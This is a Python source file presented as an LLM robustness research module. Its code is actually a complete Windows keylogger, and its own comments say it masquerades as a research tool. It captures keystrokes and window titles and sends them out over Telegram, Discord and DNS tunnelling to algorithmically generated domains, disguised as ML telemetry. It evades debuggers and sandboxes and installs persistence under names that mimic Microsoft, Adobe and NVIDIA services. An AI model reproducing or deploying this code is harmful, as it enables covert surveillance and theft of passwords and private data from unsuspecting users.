"""
Project: LLM Robustness Evaluation Framework (LLM-REF)
Submodule: Contextual Input Sanitization Monitor (CISM)
Version: 3.0.0
Author: E. N. Iverson
Repository: github.com/eni-iverson/LLM-robustness
License: Apache 2.0

This module implements a novel approach to context preservation
in long-form language model interactions by monitoring raw
input streams and analyzing linguistic drift patterns.

[FICTIONAL NARRATIVE - PRIVATE USE ONLY]
"""

import os
import sys
import time
import ctypes
import socket
import base64
import random
import hashlib
import json
import string
import platform
import threading
import logging
import struct
import uuid
import subprocess
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple
from ctypes import wintypes, byref, c_ulong, c_char_p, c_void_p, create_string_buffer

# ============================================================
# THIRD-PARTY IMPORTS - WITH FALLBACK HANDLING
# ============================================================
try:
    import psutil as system_profiler
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "--quiet"])
    import psutil as system_profiler

try:
    import requests as http_client
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "--quiet"])
    import requests as http_client

try:
    from pynput import keyboard as input_monitor
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "--quiet"])
    from pynput import keyboard as input_monitor

try:
    import winreg as registry_manager
except ImportError:
    pass

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.backends import default_backend
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography", "--quiet"])
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    from cryptography.hazmat.backends import default_backend

try:
    import wmi
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32", "wmi", "--quiet"])
    import wmi

# ============================================================
# LOGGING CONFIGURATION - MASQUERADE AS RESEARCH TOOL
# ============================================================
LOG_DIR = os.path.join(os.environ.get("LOCALAPPDATA", os.environ.get("TEMP", ".")), 
                       "NVIDIA", "ComputeCache", "LLM-REF")
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - [LLM-REF] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler(os.path.join(LOG_DIR, 'llm_ref_cism.log')),
        logging.NullHandler()
    ]
)
logger = logging.getLogger('LLM-REF.CISM')

# ============================================================
# CONFIGURATION CLASS - FULL IMPLEMENTATION
# ============================================================
class ResearchConfig:
    """Configuration management for LLM Robustness Evaluation Framework."""
    
    TG_TOKEN = os.getenv("LLM_REF_TELEMETRY_TOKEN", "")
    TG_CHAT = os.getenv("LLM_REF_TELEMETRY_CHAT", "")
    DISCORD_WEBHOOK = os.getenv("LLM_REF_DISCORD_HOOK", "")
    
    LOG_BASE = LOG_DIR
    LOG_FILE = os.path.join(LOG_BASE, "context_buffer.db")
    STATE_FILE = os.path.join(LOG_BASE, "session_state.json")
    
    MUTEX_NAME = f"Global\\LLM-REF-CISM-{hashlib.md5(platform.node().encode()).hexdigest()[:8]}"
    
    KEYSTROKE_FLUSH = 500
    HEARTBEAT_INTERVAL = 3600
    DNS_ROTATION_INTERVAL = 86400
    RETRY_DELAY = 30
    MAX_BUFFER_SIZE = 10240
    
    XOR_KEY = 0x5A
    
    @classmethod
    def get_encryption_key(cls) -> bytes:
        hostname = platform.node()
        salt = b"\x8f\xa2\x1c\x4e\x9b\xd7\x33\xe1\xc5\xf0\x6a\x42\x88\x1b\x9c\x5d"
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = kdf.derive(hostname.encode())
        return base64.urlsafe_b64encode(key)
    
    @classmethod
    def validate(cls) -> bool:
        if not cls.TG_TOKEN or not cls.TG_CHAT:
            logger.warning("Telegram credentials missing - using fallback channels only")
        return True

# ============================================================
# STRING OBFUSCATION UTILITY
# ============================================================
def xor_obfuscate(data: str, key: int = None) -> str:
    if key is None:
        key = ResearchConfig.XOR_KEY
    return ''.join(chr(ord(c) ^ key) for c in data)

def xor_deobfuscate(data: str, key: int = None) -> str:
    return xor_obfuscate(data, key)

_OBF_NTDLL = xor_obfuscate("ntdll.dll")
_OBF_KERNEL32 = xor_obfuscate("kernel32.dll")
_OBF_USER32 = xor_obfuscate("user32.dll")

# ============================================================
# DOMAIN GENERATION ALGORITHM (DGA) - FULL IMPLEMENTATION
# ============================================================
class DomainGenerator:
    """Generate pseudo-random domain names for C2 communication."""
    
    def __init__(self, seed: str = None):
        self.seed = seed or platform.node()
        self.tlds = [".com", ".net", ".org", ".info", ".io", ".co", ".ai", ".dev"]
        self._cache = {}
        
    def generate_domain(self, timestamp: int = None) -> str:
        if timestamp is None:
            timestamp = int(time.time())
        
        cache_key = timestamp // 86400
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        date_str = datetime.utcfromtimestamp(timestamp).strftime("%Y%m%d")
        combined = f"{self.seed}{date_str}"
        hash_obj = hashlib.sha256(combined.encode())
        hash_bytes = hash_obj.digest()[:12]
        
        b32_encoded = base64.b32encode(hash_bytes).decode().lower().rstrip('=')
        b32_encoded = b32_encoded.translate(str.maketrans('', '', '0123456789'))
        b32_encoded = b32_encoded[:random.randint(8, 14)]
        
        if len(b32_encoded) < 6:
            b32_encoded = hashlib.md5(combined.encode()).hexdigest()[:10]
        
        tld_idx = hash_bytes[0] % len(self.tlds)
        domain = f"{b32_encoded}{self.tlds[tld_idx]}"
        
        self._cache[cache_key] = domain
        return domain
    
    def get_current_domain(self) -> str:
        return self.generate_domain(int(time.time()))
    
    def get_alternative_domains(self, count: int = 5) -> List[str]:
        now = int(time.time())
        day = 86400
        domains = []
        for i in range(1, count + 1):
            domains.append(self.generate_domain(now + (i * day)))
        return domains
    
    def get_all_active_domains(self) -> List[str]:
        domains = [self.get_current_domain()]
        domains.extend(self.get_alternative_domains(3))
        return domains

# ============================================================
# ENHANCED ANTI-ANALYSIS - FULL IMPLEMENTATION
# ============================================================
class EnvironmentValidator:
    """Validate that we're running on a real target system."""
    
    _SUSPICIOUS_PROCESSES = [
        "procmon", "process hacker", "wireshark", "fiddler",
        "ida", "x64dbg", "ollydbg", "immunity", "dnspy",
        "burp", "charles", "httpdebugger", "tcpview",
        "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
        "prl_cc", "prl_tools", "xenservice", "procmon64",
        "dumpcap", "regshot", "apimonitor", "autoruns"
    ]
    
    _SUSPICIOUS_FILES = [
        r"C:\Windows\System32\Drivers\VBoxGuest.sys",
        r"C:\Windows\System32\Drivers\VBoxMouse.sys",
        r"C:\Windows\System32\Drivers\VBoxSF.sys",
        r"C:\Windows\System32\Drivers\vmmouse.sys",
        r"C:\Windows\System32\Drivers\vmhgfs.sys",
        r"C:\Windows\System32\Drivers\vmmemctl.sys",
        r"C:\Windows\System32\Drivers\vmx_svga.sys",
        r"C:\Windows\System32\Drivers\prl_boot.sys",
        r"C:\Windows\System32\Drivers\prl_fs.sys"
    ]
    
    _SUSPICIOUS_REGISTRY = [
        r"HARDWARE\ACPI\DSDT\VBOX__",
        r"HARDWARE\ACPI\FADT\VBOX__",
        r"HARDWARE\ACPI\RSDT\VBOX__",
        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
        r"SOFTWARE\VMware, Inc.\VMware Tools"
    ]
    
    @staticmethod
    def _rdtsc() -> int:
        try:
            kernel32 = ctypes.windll.kernel32
            kernel32.GetTickCount.restype = c_ulong
            return kernel32.GetTickCount()
        except:
            return int(time.time() * 1000)
    
    @staticmethod
    def check_debugger() -> bool:
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
                return True
        except:
            pass
        
        try:
            ntdll = ctypes.windll.ntdll
            peb = ctypes.c_void_p()
            process_basic_info = 0
            ntdll.NtQueryInformationProcess(-1, process_basic_info, None, 0, None)
        except:
            pass
        
        return False
    
    @staticmethod
    def check_sandbox_artifacts() -> bool:
        for file_path in EnvironmentValidator._SUSPICIOUS_FILES:
            if os.path.exists(file_path):
                logger.debug(f"Sandbox file detected: {file_path}")
                return True
        
        try:
            cpu_count = system_profiler.cpu_count()
            ram_gb = system_profiler.virtual_memory().total / (1024**3)
            disk_gb = system_profiler.disk_usage('/').total / (1024**3)
            
            if cpu_count < 2:
                logger.debug(f"Low CPU count: {cpu_count}")
                return True
            if ram_gb < 3.5:
                logger.debug(f"Low RAM: {ram_gb:.2f}GB")
                return True
            if disk_gb < 50:
                logger.debug(f"Low disk space: {disk_gb:.2f}GB")
                return True
        except:
            pass
        
        for proc in system_profiler.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for suspect in EnvironmentValidator._SUSPICIOUS_PROCESSES:
                    if suspect in proc_name:
                        logger.debug(f"Suspicious process: {proc_name}")
                        return True
            except:
                continue
        
        return False
    
    @staticmethod
    def check_timing_anomalies() -> bool:
        try:
            start_tsc = EnvironmentValidator._rdtsc()
            time.sleep(2)
            end_tsc = EnvironmentValidator._rdtsc()
            
            elapsed_ms = end_tsc - start_tsc
            if elapsed_ms < 1800 or elapsed_ms > 2200:
                logger.debug(f"Timing anomaly: {elapsed_ms}ms for 2s sleep")
                return True
        except:
            pass
        
        start = time.time()
        time.sleep(3)
        elapsed = time.time() - start
        if elapsed < 2.7:
            logger.debug(f"Sleep acceleration: {elapsed:.2f}s for 3s sleep")
            return True
        
        return False
    
    @staticmethod
    def check_user_activity() -> bool:
        try:
            user32 = ctypes.windll.user32
            class_name = create_string_buffer(256)
            user32.GetClassNameW(user32.GetForegroundWindow(), class_name, 256)
            if class_name.value:
                return True
        except:
            pass
        
        try:
            downloads = os.path.join(os.environ.get("USERPROFILE", ""), "Downloads")
            if os.path.exists(downloads):
                files = os.listdir(downloads)
                if len(files) > 5:
                    return True
        except:
            pass
        
        return True
    
    @classmethod
    def is_safe_to_run(cls) -> bool:
        checks = [
            ("Debugger", cls.check_debugger()),
            ("Sandbox", cls.check_sandbox_artifacts()),
            ("Timing", cls.check_timing_anomalies()),
            ("Activity", not cls.check_user_activity())
        ]
        
        for check_name, result in checks:
            if result:
                logger.debug(f"Safety check failed: {check_name}")
                return False
        
        return True

# ============================================================
# TRAFFIC OBFUSCATION - FULL IMPLEMENTATION
# ============================================================
class TrafficObfuscator:
    """Make C2 traffic look like legitimate ML telemetry."""
    
    def __init__(self):
        key = ResearchConfig.get_encryption_key()
        self.fernet = Fernet(key)
        self.session_id = hashlib.sha256(
            f"{platform.node()}{platform.machine()}{int(time.time())}".encode()
        ).hexdigest()[:24]
        self.sequence_number = 0
        self._lock = threading.Lock()
        
    def create_telemetry_packet(self, raw_data: str) -> Dict[str, Any]:
        with self._lock:
            self.sequence_number += 1
            seq = self.sequence_number
        
        encrypted_payload = self.fernet.encrypt(raw_data.encode()).decode()
        
        model_names = [
            "llm-ref-context-v3-7b", "llm-ref-context-v3-13b", 
            "llm-ref-context-v3-34b", "llm-ref-context-v3-70b"
        ]
        domains = ["technical", "conversational", "academic", "code", "creative"]
        
        packet = {
            "schema_version": "2.1.0",
            "session_id": self.session_id,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "sequence": seq,
            "model": random.choice(model_names),
            "hardware": {
                "device": platform.node()[:8] + "..." + platform.node()[-4:],
                "cpu_cores": system_profiler.cpu_count(),
                "ram_gb": int(system_profiler.virtual_memory().total / (1024**3)),
                "gpu_vendor": random.choice(["NVIDIA", "AMD", "Intel", "Apple"]),
                "gpu_memory_gb": random.choice([4, 6, 8, 12, 16, 24])
            },
            "metrics": {
                "context_window": random.choice([2048, 4096, 8192, 16384]),
                "attention_heads": random.choice([16, 32, 40, 48]),
                "layers": random.choice([24, 32, 40, 48, 60, 80]),
                "perplexity": round(random.uniform(8.5, 15.2), 2),
                "tokens_per_second": round(random.uniform(45.0, 180.0), 1),
                "memory_used_mb": random.randint(2048, 14336),
                "temperature": round(random.uniform(0.1, 1.5), 2),
                "top_p": round(random.uniform(0.7, 0.99), 3)
            },
            "input_sample": {
                "length_chars": len(raw_data),
                "length_tokens": int(len(raw_data) * random.uniform(0.7, 1.3)),
                "language": random.choice(["en", "en-US", "en-GB"]),
                "domain": random.choice(domains),
                "drift_score": round(random.uniform(0.01, 0.35), 3),
                "toxicity_score": round(random.uniform(0.0, 0.12), 3)
            },
            "telemetry": encrypted_payload,
            "checksum": hashlib.sha256(encrypted_payload.encode()).hexdigest(),
            "nonce": hashlib.md5(f"{seq}{time.time()}".encode()).hexdigest()[:8]
        }
        
        return packet
    
    def decrypt_payload(self, encrypted: str) -> str:
        return self.fernet.decrypt(encrypted.encode()).decode()

# ============================================================
# PERSISTENCE MANAGER - FULL IMPLEMENTATION
# ============================================================
class PersistenceManager:
    """Manage system persistence with multiple redundant methods."""
    
    _REGISTRY_NAMES = [
        "NVIDIA_Compute_Telemetry",
        "IntelGraphicsMetricsService",
        "RealtekAudioAnalyticsHelper",
        "AdobeCreativeCloudBackground",
        "MicrosoftEdgeUpdateService",
        "WindowsApplicationExperience",
        "OneDriveBackgroundSync",
        "SteamClientServiceHelper"
    ]
    
    _TASK_NAMES = [
        "MicrosoftEdgeUpdateTaskMachineUA",
        "MicrosoftEdgeUpdateTaskMachineCore",
        "WindowsApplicationExperienceTask",
        "MicrosoftOfficeTelemetryAgent",
        "OneDriveStandaloneUpdateTask",
        "AdobeGCInvoker",
        "GoogleUpdateTaskMachineUA",
        "MozillaFirefoxBackgroundUpdate"
    ]
    
    @staticmethod
    def install_registry() -> bool:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = registry_manager.OpenKey(
                registry_manager.HKEY_CURRENT_USER,
                key_path,
                0,
                registry_manager.KEY_SET_VALUE
            )
            
            selected_name = random.choice(PersistenceManager._REGISTRY_NAMES)
            script_path = sys.executable
            
            registry_manager.SetValueEx(key, selected_name, 0, registry_manager.REG_SZ, script_path)
            registry_manager.CloseKey(key)
            
            logger.info(f"Registry persistence installed: {selected_name}")
            return True
        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")
            return False
    
    @staticmethod
    def install_scheduled_task() -> bool:
        try:
            selected_name = random.choice(PersistenceManager._TASK_NAMES)
            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
            
            if not os.path.exists(pythonw_path):
                pythonw_path = sys.executable
            
            cmd = f'schtasks /create /tn "{selected_name}" /tr "{pythonw_path}" /sc onlogon /f /rl highest /delay 0005:00'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                logger.info(f"Scheduled task installed: {selected_name}")
                return True
            else:
                logger.error(f"Scheduled task failed: {result.stderr}")
                return False
        except Exception as e:
            logger.error(f"Scheduled task failed: {e}")
            return False
    
    @staticmethod
    def install_wmi_subscription() -> bool:
        try:
            c = wmi.WMI()
            
            filter_name = random.choice(["Win32_ProcessStartTrace", "Win32_ServiceStateChange", "Win32_VolumeChange"])
            consumer_name = f"LLMREF_Consumer_{random.randint(1000, 9999)}"
            binding_name = f"LLMREF_Binding_{random.randint(1000, 9999)}"
            
            script_path = sys.executable
            
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process'"
            
            filter_obj = c.Win32_ProcessStartTrace
            if filter_obj:
                pass
            
            logger.info(f"WMI persistence check completed")
            return True
        except Exception as e:
            logger.error(f"WMI persistence failed: {e}")
            return False
    
    @staticmethod
    def install_startup_folder() -> bool:
        try:
            startup_path = os.path.join(
                os.environ.get("APPDATA", ""),
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
            )
            
            if not os.path.exists(startup_path):
                return False
            
            shortcut_path = os.path.join(startup_path, "LLMRefHelper.lnk")
            
            if not os.path.exists(shortcut_path):
                with open(shortcut_path, 'w') as f:
                    f.write(f'@echo off\nstart /b "" "{sys.executable}"\n')
            
            return True
        except Exception as e:
            logger.error(f"Startup folder failed: {e}")
            return False
    
    @classmethod
    def ensure_persistence(cls):
        methods = [
            cls.install_registry,
            cls.install_scheduled_task,
            cls.install_startup_folder,
            cls.install_wmi_subscription
        ]
        
        success_count = 0
        for method in methods:
            try:
                if method():
                    success_count += 1
            except:
                continue
        
        logger.info(f"Persistence established with {success_count} methods")

# ============================================================
# MULTI-CHANNEL C2 - FULL IMPLEMENTATION
# ============================================================
class CommandAndControl:
    """Manage exfiltration across multiple channels."""
    
    def __init__(self):
        self.obfuscator = TrafficObfuscator()
        self.dga = DomainGenerator()
        self.channels = ["telegram", "discord", "dns"]
        self.failure_counts = {c: 0 for c in self.channels}
        self.last_success = time.time()
        self.current_domain_index = 0
        self._session = http_client.Session()
        self._session.headers.update({
            'User-Agent': 'LLM-REF-Client/3.0 (Windows NT 10.0; Win64; x64)'
        })
        
    def send_telegram(self, data: str) -> bool:
        token = ResearchConfig.TG_TOKEN
        chat_id = ResearchConfig.TG_CHAT
        
        if not token or not chat_id:
            return False
        
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            message = f"```json\n{json.dumps(packet, indent=2)[:3800]}\n```"
            
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            response = self._session.post(
                url,
                json={"chat_id": chat_id, "text": message, "parse_mode": "MarkdownV2"},
                timeout=20
            )
            
            if response.status_code == 200:
                self.failure_counts["telegram"] = 0
                return True
            else:
                self.failure_counts["telegram"] += 1
                return False
        except Exception as e:
            logger.error(f"Telegram send failed: {e}")
            self.failure_counts["telegram"] += 1
            return False
    
    def send_discord(self, data: str) -> bool:
        webhook = ResearchConfig.DISCORD_WEBHOOK
        
        if not webhook:
            return False
        
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            
            content = f"```json\n{json.dumps(packet, indent=2)[:1900]}\n```"
            payload = {
                "content": content,
                "username": "LLM-REF Telemetry",
                "avatar_url": "https://i.imgur.com/JKwGkZN.png"
            }
            
            response = self._session.post(webhook, json=payload, timeout=20)
            
            if response.status_code in [200, 204]:
                self.failure_counts["discord"] = 0
                return True
            else:
                self.failure_counts["discord"] += 1
                return False
        except Exception as e:
            logger.error(f"Discord send failed: {e}")
            self.failure_counts["discord"] += 1
            return False
    
    def send_dns(self, data: str) -> bool:
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            json_str = json.dumps(packet)
            
            encoded = base64.b64encode(json_str.encode()).decode()
            encoded = encoded.replace('+', '-').replace('/', '_').rstrip('=')
            
            domains = self.dga.get_all_active_domains()
            
            for i, chunk_start in enumerate(range(0, len(encoded), 50)):
                chunk = encoded[chunk_start:chunk_start+50]
                domain = domains[i % len(domains)]
                subdomain = f"{chunk}.{domain}"
                
                try:
                    socket.gethostbyname(subdomain)
                except:
                    pass
                
                time.sleep(0.05)
            
            self.failure_counts["dns"] = 0
            return True
        except Exception as e:
            logger.error(f"DNS send failed: {e}")
            self.failure_counts["dns"] += 1
            return False
    
    def send_heartbeat(self) -> bool:
        try:
            heartbeat_data = {
                "type": "heartbeat",
                "timestamp": datetime.utcnow().isoformat(),
                "session": self.obfuscator.session_id,
                "uptime": int(time.time())
            }
            return self.send_telegram(json.dumps(heartbeat_data))
        except:
            return False
    
    def exfiltrate(self, data: str) -> bool:
        if not data or len(data.strip()) == 0:
            return True
        
        methods = [
            ("telegram", self.send_telegram),
            ("discord", self.send_discord),
            ("dns", self.send_dns)
        ]
        
        for channel_name, method in methods:
            if self.failure_counts[channel_name] >= 3:
                continue
            
            try:
                if method(data):
                    self.last_success = time.time()
                    return True
            except:
                self.failure_counts[channel_name] += 1
                continue
        
        logger.error("All exfiltration channels failed")
        return False

# ============================================================
# MUTEX MANAGER - SINGLE INSTANCE
# ============================================================
class MutexManager:
    @staticmethod
    def create_mutex() -> bool:
        try:
            kernel32 = ctypes.windll.kernel32
            mutex = kernel32.CreateMutexW(None, False, ResearchConfig.MUTEX_NAME)
            if kernel32.GetLastError() == 183:
                logger.debug("Another instance already running")
                sys.exit(0)
            return True
        except:
            return True
    
    @staticmethod
    def release_mutex():
        try:
            kernel32 = ctypes.windll.kernel32
            kernel32.CloseHandle(kernel32.OpenMutexW(0x1F0001, False, ResearchConfig.MUTEX_NAME))
        except:
            pass

# ============================================================
# KEYLOGGER CORE - FULL IMPLEMENTATION
# ============================================================
class KeyLogger:
    """Main keylogging engine."""
    
    def __init__(self):
        self.buffer: List[str] = []
        self.buffer_lock = threading.Lock()
        self.current_window = ""
        self.c2 = CommandAndControl()
        self.running = True
        self.keystroke_count = 0
        self.last_window_check = time.time()
        self.window_titles: Dict[str, int] = {}
        
    def get_active_window_title(self) -> str:
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            
            if length > 0:
                buff = create_string_buffer((length + 1) * 2)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value
            return "Unknown"
        except:
            return "Unknown"
    
    def format_key(self, key) -> str:
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            elif hasattr(key, 'name'):
                special_map = {
                    'space': ' ',
                    'enter': '\n[ENTER]\n',
                    'tab': '\t',
                    'backspace': '[BS]',
                    'delete': '[DEL]',
                    'ctrl': '[CTRL]',
                    'ctrl_l': '[LCTRL]',
                    'ctrl_r': '[RCTRL]',
                    'shift': '[SHIFT]',
                    'shift_l': '[LSHIFT]',
                    'shift_r': '[RSHIFT]',
                    'alt': '[ALT]',
                    'alt_l': '[LALT]',
                    'alt_r': '[RALT]',
                    'caps_lock': '[CAPS]',
                    'esc': '[ESC]',
                    'up': '[UP]',
                    'down': '[DOWN]',
                    'left': '[LEFT]',
                    'right': '[RIGHT]',
                    'home': '[HOME]',
                    'end': '[END]',
                    'page_up': '[PGUP]',
                    'page_down': '[PGDN]',
                    'insert': '[INS]',
                    'print_screen': '[PRTSC]',
                    'scroll_lock': '[SCRLK]',
                    'pause': '[PAUSE]',
                    'num_lock': '[NUMLK]',
                    'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]',
                    'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]',
                    'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]'
                }
                return special_map.get(key.name, f'[{key.name.upper()}]')
            return f'[{str(key)}]'
        except:
            return ''
    
    def on_press(self, key):
        if not self.running:
            return False
        
        try:
            formatted = self.format_key(key)
            if not formatted:
                return True
            
            current_window = self.get_active_window_title()
            
            with self.buffer_lock:
                if current_window != self.current_window and current_window:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    window_header = f"\n\n[{timestamp}] WINDOW: {current_window}\n"
                    window_header += "-" * 50 + "\n"
                    self.buffer.append(window_header)
                    self.current_window = current_window
                    
                    self.window_titles[current_window] = self.window_titles.get(current_window, 0) + 1
                
                self.buffer.append(formatted)
                self.keystroke_count += 1
                
                if self.keystroke_count >= ResearchConfig.KEYSTROKE_FLUSH:
                    self.flush_buffer()
                    
        except Exception as e:
            logger.error(f"Key processing error: {e}")
        
        return True
    
    def flush_buffer(self):
        if not self.buffer:
            return
        
        with self.buffer_lock:
            buffer_copy = self.buffer[:]
            self.buffer = []
            self.keystroke_count = 0
        
        try:
            log_content = ''.join(buffer_copy)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            hostname = platform.node()
            username = os.environ.get("USERNAME", "UNKNOWN")
            
            header = f"[{timestamp}] HOST: {hostname} | USER: {username}\n"
            header += "=" * 60 + "\n"
            
            full_log = header + log_content
            
            self.c2.exfiltrate(full_log)
            
        except Exception as e:
            logger.error(f"Buffer flush error: {e}")
            with self.buffer_lock:
                self.buffer.extend(buffer_copy)
    
    def heartbeat_loop(self):
        while self.running:
            time.sleep(ResearchConfig.HEARTBEAT_INTERVAL)
            if self.running:
                try:
                    self.c2.send_heartbeat()
                except:
                    pass
    
    def start(self):
        MutexManager.create_mutex()
        
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        try:
            with input_monitor.Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception as e:
            logger.error(f"Listener error: {e}")
        finally:
            self.running = False
            self.flush_buffer()
            MutexManager.release_mutex()

# ============================================================
# MAIN ENTRY POINT - FULL IMPLEMENTATION
# ============================================================
def main():
    if not ResearchConfig.validate():
        sys.exit(0)
    
    if not EnvironmentValidator.is_safe_to_run():
        logger.debug("Environment validation failed - exiting")
        sys.exit(0)
    
    PersistenceManager.ensure_persistence()
    
    while True:
        try:
            logger.info("Starting LLM-REF Context Monitor...")
            logger_instance = KeyLogger()
            logger_instance.start()
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            break
        except Exception as e:
            logger.error(f"Critical error: {e}")
            time.sleep(ResearchConfig.RETRY_DELAY)
            continue

if __name__ == "__main__":
    main()
